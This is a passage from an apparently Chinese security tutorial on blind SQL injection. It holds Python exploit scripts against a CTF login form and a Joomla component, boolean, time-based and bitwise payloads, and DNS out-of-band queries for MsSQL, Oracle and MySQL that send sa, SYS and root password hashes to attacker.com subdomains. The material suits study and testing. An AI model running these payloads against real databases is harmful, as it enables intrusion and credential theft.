[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A820.png)

我下面给出这个代码的 exp

**exp.py**

```
import requests

url = "http://xxx.xxx.xxx.xxx:8300/index.php?action=login"
data = `{`
    "username": "",
    "password": "123"
`}`
payload = "1'^(ascii(mid((flag)from(`{``}`)))&gt;`{``}`)^'"
flag = ""
for i in xrange(1, 39):
    start = 32
    end = 126
    while start &lt; end:
        mid = (start + end) / 2
        data['username'] = payload.format(str(i), str(mid))
        r = requests.post(url, data = data)
        if 'Invalid username or password' not in r.content:
            start = mid + 1
        else:
            end = mid
    flag += chr(start)
    print flag
```

可以好好看一下这个 payload 部分是怎么构造的，联系一下我们之前讲过的内容分析一下。

##### **4.使用 ~**

这个方法是这样的，当系统不允许输入大的数字的时候，可能是限制了字符的长度，限制了不能使用科学计数法，但是我们还是想让其报错，我们就能采取这种方式，如下所示

```
mysql&gt; select ~1 ;
+----------------------+
| ~1                   |
+----------------------+
| 18446744073709551614 |
+----------------------+
1 row in set (0.00 sec)

mysql&gt; select bin(~1);
+------------------------------------------------------------------+
| bin(~1)                                                          |
+------------------------------------------------------------------+
| 1111111111111111111111111111111111111111111111111111111111111110 |
+------------------------------------------------------------------+
1 row in set (0.32 sec)
```

我想学过二进制的就一目了然了，这种方法往往用在报错注入，但是实际上我之前说了，我还是把这种方式归为布尔盲注里面，请看下面的两个例子

###### **示例1：**

```
mysql&gt; select * from bsqli where id = 1 and if(1,1,exp(~(select * from (select database())a)));
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1 and if(0,1,exp(~(select * from (select database())a)));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))'
```

###### **示例2：**

```
mysql&gt; select * from bsqli where id = 1 and  if(1,1,1-~1);
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
|  1 | K0rz3n | 123456   |
+----+--------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from bsqli where id = 1 and if(0,1,1-~1);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(1))'
```

##### **5.使用 &lt;&lt; 或 &gt;&gt;**

这个想法来源于外国人的一个测试 [文章地址](https://www.exploit-db.com/papers/17073)，实际上这个方法是我们平时用的二分法的优化（好久没看这个 exploit-db 怎么变成这么炫酷了~ 逃

因为这篇文章讲的可以说是文不加点了，所以我就直接将其中的一部分翻译过来做简单的说明

我们想测试 user() 用户的第一个字符，我们需要像下面这样做

**(1)首先我们右移7位，可能的结果是1和0。**

```
mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 7)=0;
+--------------------------------------+
| (ascii((substr(user(),1,1))) &gt;&gt; 7)=0 |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row in set (0.00 sec)
```

此时说明第一个 Bit 位为 0<br>
0???????

**(2)下一位是0或1所以我们把它和0比较。**

```
mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 6)=0;
+--------------------------------------+
| (ascii((substr(user(),1,1))) &gt;&gt; 6)=0 |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

此时我们知道第二位 Bit 位为 1<br>
01??????

**(3)接下来的前三位可能有下面两种**

010 = 2<br>
011 = 3

```
mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 5)=2;
+--------------------------------------+
| (ascii((substr(user(),1,1))) &gt;&gt; 5)=2 |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

说明第三 Bit 是 1<br>
011?????

…

**(8)最后能判断**

```
mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 0)=114;
+----------------------------------------+
| (ascii((substr(user(),1,1))) &gt;&gt; 0)=114 |
+----------------------------------------+
|                                      1 |
+----------------------------------------+
1 row in set (0.00 sec)
```

最终的第一个字符的二进制是：<br>
01110010

```
mysql&gt; select b'01110010';
+-------------+
| b'01110010' |
+-------------+
| r           |
+-------------+
1 row in set (0.00 sec)
```

**最终的字符是 r**

##### **6.一点点补充**

同样补充一下关于 inster 和 update 的盲注示例

```
update users set username = '0' | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;

insert into users values (15,'K0rz3n','0'| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));
```



## 0X04 数据提取方法

由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。

比较常见的是 mid() substr() locate() position() substring() left() regexp like rlike length() char_length() ord() ascii() char() hex() 以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。

### **1.举几个简单的例子：**

#### **示例1**

**测试情况：**

```
1'and if(length(database())=1,sleep(5),1) # 没有延迟

1'and if(length(database())=2,sleep(5),1) # 没有延迟

1'and if(length(database())=3,sleep(5),1) # 没有延迟

1'and if(length(database())=4,sleep(5),1) # 明显延迟
```

**说明：**数据库名字长度为 4

#### **示例2**

**测试情况：**

```
1'and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟
…
1'and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟

1'and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟

```

**说明:**数据库名的第一个字符为小写字母d

#### **示例3**

**测试情况：**

```
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[a-f]' AND
ID=1)
False
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-9]' AND
ID=1)
True
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-4]' AND
ID=1)
False
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-9]' AND
ID=1)
True
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-7]' AND
ID=1)
True
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^5' AND
ID=1)
True
```

**说明:**密码 hash 的第一个字符为5

更多函数例如 left 以及更详细的用法指南请见这篇文章的字符串部分 [传送门](http://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/)

### **2.二分法提取数据**

实际上我们上面的例子里面已经涉及到部分二分法的知识了，二分法对于我们猜解来讲是提高效率的非常好的方法，简单的说就是先和范围中间的值进行比较，然后判断数据是在中间值左边部分还是右边部分，然后继续相同的操作，直到正确猜中

想了一下是画图后来觉得不如直接上代码，下面是 C 语言实现二分法查找的一个例子 ：

```
int search(int arr[],int n,int key)
`{`
　　 int low = 0,high = n-1;
 　　int mid,count=0;
 　　while(low&lt;=high)
　　 `{`
  　　　　mid = (low+high)/2;
  　　　　if(arr[mid] == key)
   　　　　　　return mid;
  　　　　if(arr[mid]&lt;key)
  　　　　　　 low = mid + 1;
  　　　　else
  　　　　　　 high = mid - 1;
 　　`}`
 　　return -1;
`}`
```

下面是一个示例代码，来源于 [这篇文章](https://www.freebuf.com/articles/web/175049.html)，其实我上面的那个 CTF 题的 EXP 也用的是二分法

```
# -*- coding:UTF-8 -*-
import requests
import sys
# 准备工作
url = 'http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]='
string = '0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
flag = ''
cookies = `{`'9e44025326f96e2d9dc1a2aab2dbe5b1' : 'l1p92lf44gi4s7jdf5q73l0bt5'`}`
response = requests.get('http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (ascii(substr((select database()),1,1)) &gt; 78) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)',cookies=cookies,timeout=2)
print(response.text)
i = 1
while i &lt;= 7:
    left = 0
    right = len(string) - 1
    mid = int((left + right) / 2)
    print('n')
    print(flag)
    print('Testing... ' + str(left) + ' ' + str(right))
    # 特殊情况
    if (right - left) == 1:
        payload = "(CASE WHEN (ascii(substr((select database()),`{`0`}`,1))&gt;`{`1`}`) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[left])))
        poc = url + payload
        print(poc)
        response = requests.get(poc,cookies=cookies,timout=2)
        if ('安全令牌无效') in response.text:
            flag = flag + string[right]
            print(flag)
            exit()
        else: 
            flag = flag + string[left]
            print(flag)
            exit()
    # 二分法
    while 1:
        mid = int((left + right) / 2)
        payload = "(CASE WHEN (ascii(substr((select database()),`{`0`}`,1))&gt;`{`1`}`) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[mid])))
        poc = url + payload
        print(poc)
        response = requests.get(poc,cookies=cookies,timeout=2)
        # 右半部
        if ('安全令牌无效') in response.text:
            left = mid + 1
            print('left:'+str(left))
        # 左半部
        else: 
            right = mid
            print('right:'+str(right))
        if (left == right):
            flag = flag + string[left]
            break
        # 特殊情况
        if (right - left) == 1:
            payload = "(CASE WHEN (ascii(substr((select database()),`{`0`}`,1))&gt;`{`1`}`) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[left])))
            poc = url + payload
            print(poc)
            response = requests.get(poc,cookies=cookies,timeout=2)
            if ('安全令牌无效') in response.text:
                flag = flag + string[right]
                print(flag)
                break
            else: 
                flag = flag + string[left]
                print(flag)
                break
    i += 1
print(flag)
```



## 0X05 高级技巧

这里要讲的高级技巧就是著名的 Blind OOB(out of bind),在盲注中使用 dns 进行外带的技巧，当然这个方法是有限制条件的，

> <p>**要求 :**<br>
除了Oracle 支持 windows 和 Linux 系统的攻击以外其他攻击只能在Windows环境下（UNC路径）</p>

### **1.简单介绍：**

服务器可以将 DNS 查询从安全系统转发到互联网中任意 DNS 服务器，这种行为构成了不受控制的数据传输通道的基础。即使我们假设不允许服务器与公共网络连接，如果目标主机能够解析任意域名，也可以通过转发的 DNS 查询进行数据外带。在 sql 盲注中我们通常以逐位方式检索数据，这是非常繁琐且耗时的过程。因此，攻击者通常需要数万个请求来检索常规大小的表的内容。

而这种 DNS 外带的方式，可以使得攻击者通过从易受攻击的数据库管理系统（DBMS）发出特制的DNS请求，攻击者可以在另一端拦截来查看恶意SQL查询（例如管理员密码）的结果，在这种情况下每次能传输数十个字符。

此类攻击最有可能发生在任何接受网络地址的功能上，下面是整个攻击过程的示意图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A821.png)

### **2.针对 MsSQL**

扩展存储过程是直接在Microsoft SQL Server（MsSQL）的地址空间中运行的动态链接库。攻击者可以使用部分存储过程配合符合 Windows Universal Naming Convention（通用命名规则UNC）的文件和路径格式来触发 DNS 解析

**格式如下：**

```
\ComputerNameSharedFolderResource
```

通过将 ComputerName 设置为自定义的地址的值，攻击者能够完成攻击，下面是可以利用的扩展。存储过程。

#### **1.master..xp_dirtree**

这个扩展存储过程用来获取指定的目录列表和其所有子目录，使用方式如下：

```
master..xp_dirtree '&lt;dirpath&gt;'
```

比如想要获取 C:Windows 目录下的所有目录及其子目录

```
EXEC master..xp_dirtree 'C:Windows';
```

#### **2.master..xp_fileexist**

这个扩展存储过程能判断某一文件是否在磁盘上，使用方式如下：

```
xp_fileexist '&lt;filepath&gt;'
```

例如想要检查 boot.ini 这个文件是否在 C盘

```
EXEC master..xp_fileexist 'C:boot.ini';
```

#### **3.master..xp_subdirs**

这个扩展存储过程可以给出指定的目录下的所有目录列表，使用方式如下：

```
master..xp_subdirs '&lt;dirpath&gt;'
```

例如：列出 C:Windows 下的所有第一层子目录

```
EXEC master..xp_subdirs 'C:Windows';
```

#### **4.实战案例**

下面的例子讲述的是如何通过 master..xp_dirtree() 这个扩展存储过程将 sa 的密码的 哈希值通过 DNS 请求外带

```
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1
master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins WHERE name='sa')
+'.attacker.com';
EXEC('master..xp_dirtree "\'+@host+'foobar$"');
```

使用此预先计算形式是因为扩展存储过程不接受子查询作为给定参数值。 因此使用临时变量来存储SQL查询的结果。

### **3.针对 Oracle**

Oracle提供了一套PL / SQL软件包及其Oracle数据库服务器来扩展数据库功能。 其中几个特别适用于网络访问，从而能很好地在攻击中加以利用。

#### **1.UTL_INADDR.GET_HOST_ADDRESS**

包UTL_INADDR提供了Internet寻址支持 – 例如检索本地和远程主机的主机名和IP地址。 其中成员函数 GET_HOST_ADDRESS（）<br>
检索指定主机的IP地址，使用方法：

```
UTL_INADDR.GET_HOST_ADDRESS（'&lt;host&gt;'）
```

例如，要获取主机test.example.com的IP地址，

```
SELECT UTL_INADDR.GET_HOST_ADDRESS（'test.example.com'）;
```

#### **2.UTL_HTTP.REQUEST**

包UTL_HTTP从SQL和PL / SQL发出HTTP调用。 它的方法 REQUEST（）可以返回从给定地址获取的前2000个字节的数据，使用方法：

```
UTL_HTTP.REQUEST('&lt;url&gt;')
```

例如，想获取 [http://test.example.com/index.php开头的](http://test.example.com/index.php%E5%BC%80%E5%A4%B4%E7%9A%84) 2000 字节数据

```
SELECT UTL_HTTP.REQUEST('http://test.example.com/index.php') FROM DUAL;
```

#### **3.HTTPURITYPE.GETCLOB**

类HTTPURITYPE的实例方法GETCLOB（）返回从给定地址检索的 [Character Large Object（CLOB）](https://baike.baidu.com/item/CLOB/6327280)，使用方法：

```
HTTPURITYPE('&lt;url&gt;').GETCLOB()
```

例如，要从位于[http://test.example.com/index.php的页面启动内容检索，请运行：](http://test.example.com/index.php%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%90%AF%E5%8A%A8%E5%86%85%E5%AE%B9%E6%A3%80%E7%B4%A2%EF%BC%8C%E8%AF%B7%E8%BF%90%E8%A1%8C%EF%BC%9A)

```
SELECT HTTPURITYPE('http://test.example.com/index.php').GETCLOB() FROM DUAL;
```

#### **4.DBMS_LDAP.INIT**

包 DBMS_LDAP 使 PL/SQL程序员能够从轻量级目录访问协议（LDAP）服务器访问数据。 它的INIT（）过程用于初始化LDAP服务器的会话，

```
DBMS_LDAP.INIT(('&lt;host&gt;',&lt;port&gt;)
```

例如 与 主机 test.example.com 初始化一个链接

```
SELECT
```

DBMS_LDAP.INIT((‘test.example.com’,80) FROM<br>
DUAL;

> **注意：**
攻击者可以使用任何提到的Oracle子例程来激发DNS请求。 但是，从Oracle11g开始，可能导致网络访问的子例程受到限制，但DBMS_LDAP.INIT() 除外

#### **5.实战案例**

以下是使用 Oracle程序DBMS_LDAP.INIT()通过DNS解析机制推送系统管理员（SYS）密码哈希的示例

```
SELECT DBMS_LDAP.INIT((SELECT password
```

FROM SYS.USER$ WHERE<br>
name=’SYS’)||’.attacker.com’,80) FROM DUAL;

### **4.针对 MySQL**

mysql 相对于前面两个数据库系统来讲就显得方法单一，只提供了一个可以利用的方法，不过还是需要条件的

#### **1.利用条件**

在MySQL中，存在一个称为 “secure_file_priv” 的全局系统变量。此变量用于限制数据导入和导出,例如由LOAD DATA和SELECT … INTO OUTFILE语句和LOAD_FILE（）函数执行的操作。

(1)如果将其设置为目录名称，则服务器会将导入和导出操作限制为仅适用于该目录中的文件。而且该目录必须存在，服务器不会自动创建它。<br>
(2)如果变量为空(没有设置)，则可以随意导入导出(不安全)<br>
(3)如果设置为NULL，则服务器禁用所有导入和导出操作。**从MySQL 5.5.53开始，该值为默认值**

另外 ‘secure_file_priv’ 是一个全局变量，且是一个只读变量，这意味着你不能在运行时更改它。

我们可以使用下面的语句查询

```
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv"; 

mysql&gt; select @@secure_file_priv;
+--------------------+
| @@secure_file_priv |
+--------------------+
|                    |
+--------------------+
1 row in set (0.00 sec)
```

此时我的 mysql 这个选项没有设置，所以可以使用这个方法

#### **1.LOAD_FILE**

mysql 的 LOAD_FILE() 能读取文件内容然后返回对应的字符串，使用方法

```
LOAD_FILE('&lt;filepath&gt;')
```

例如想获取 C:Windowssystem.ini 的内容

```
SELECT LOAD_FILE('C:\Windows\system.ini');
```

#### **2.实战案例**

以下是使用MySQL函数LOAD_FILE（）通过DNS解析机制推送系统管理员（root）密码哈希的示例：

```
SELECT LOAD_FILE(CONCAT('\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.attacker.com\foobar'));
```

我本地也做了对应的测试

```
select load_file(concat('\\',@@version,'.9a56627dc016fc8b5c6e.d.zhack.ca\a.txt'));
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A822.png)

当然我们可以对这个 payload 进行必要的编码

```
select load_file(concat(0x5c5c5c5c,@@version,0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874));
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A823.png)

> **注意:** mysql 编码的时候每个反斜线都要加一个反斜线来转义

这种方式可以用于 union 和 error-base 的 sqli 中，如下

```
http://192.168.0.100/?id=-1'+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3-- -

http://192.168.0.100/?id=-1' or !(select*from(select   load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0-- -

http://192.168.0.100/?id=-1' or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))-- -
```

当然除了or 你还可以用以下 ||, |, and, &amp;&amp;, &amp;, &gt;&gt;, &lt;&lt;, ^, xor, &lt;=, &lt;, ,&gt;, &gt;=, *, mul, /, div, -, +, %, mod.

### **5.sqlmap 的扩展**

由于这种在攻击中方便快捷的特性，sqlmap 也进行了响应的扩展来支持这种攻击方式，添加了新的命令行参数 —dns-domain

使用时指定对应的服务器

```
--dns-domain=attacker.com
```

但是因为 sqlmap 在运行过程中遵循的是 union 和 error-base 优先级最高的原则，所以只有当攻击是基于 blind 并且用户使用了上面的选项时 dns 攻击才会开始

另外每个得到的DNS解析请求都被编码为十六进制格式，因为这是DNS域名的（事实上的）标准,这样就可以保留所有最终的非单词字符。此外，较长的SQL查询结果的十六进制表示被分成几部分,这样做是因为完整域名内的每个节点的标签（例如.example.）的长度限制为63个字符。



## 0X06 总结

由于 SQLi 的涉及内容太多，我想来想去觉得一篇文章肯定不能全部涵盖，于是这篇文章主要是结合一些案例谈谈我在宏观上对 Blind SQLi 的理解，其他的关于 SQLi Bypass 的内容准备再开一个坑，由于篇幅原因，和时间仓促，文中有些内容难免出现不完善或者错误的情况，请师傅们不吝赐教。



## 0X07 参考链接

[http://www.sqlinjection.net/heavy-query/](http://www.sqlinjection.net/heavy-query/)<br>[https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/](https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/)<br>[http://php.net/manual/zh/features.persistent-connections.php](http://php.net/manual/zh/features.persistent-connections.php)<br>[https://www.freebuf.com/articles/web/30841.html](https://www.freebuf.com/articles/web/30841.html)<br>[https://www.cnblogs.com/xdans/p/5412468.html](https://www.cnblogs.com/xdans/p/5412468.html)<br>[https://www.exploit-db.com/papers/17073](https://www.exploit-db.com/papers/17073)<br>[https://www.freebuf.com/articles/web/175049.html](https://www.freebuf.com/articles/web/175049.html)<br>[https://www.jianshu.com/p/95c814c515a2](https://www.jianshu.com/p/95c814c515a2)<br>[https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html](https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html)<br>[https://www.exploit-db.com/exploits/42033](https://www.exploit-db.com/exploits/42033)<br>[https://www.freebuf.com/vuls/138838.html](https://www.freebuf.com/vuls/138838.html)<br>[https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/](https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/)
